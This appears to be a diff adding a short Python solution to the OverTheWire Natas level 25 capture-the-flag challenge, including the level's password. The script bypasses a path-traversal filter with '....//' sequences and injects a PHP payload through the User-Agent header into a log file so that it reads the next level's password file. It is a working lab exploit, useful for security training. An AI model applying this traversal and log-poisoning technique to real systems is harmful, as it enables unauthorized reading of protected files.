@@ -1,0 +1,18 @@
+natas25:O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx
+
+import requests
+
+url = 'http://natas25.natas.labs.overthewire.org/'
+s = requests.Session()
+s.auth = ('natas25', 'O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx')
+
+phpsessid = s.get(url).cookies['PHPSESSID']
+
+path = "....//....//....//....//....//"
+params  = {'lang': f"{path}var/www/natas/natas25/logs/natas25_{phpsessid}.log" }
+headers = {'User-Agent': '<?php readfile("/etc/natas_webpass/natas26") ?>'}
+
+r = s.post(url, params=params, headers=headers)
+for x in r.iter_lines():
+    if b"]" in x:
+        print(x)
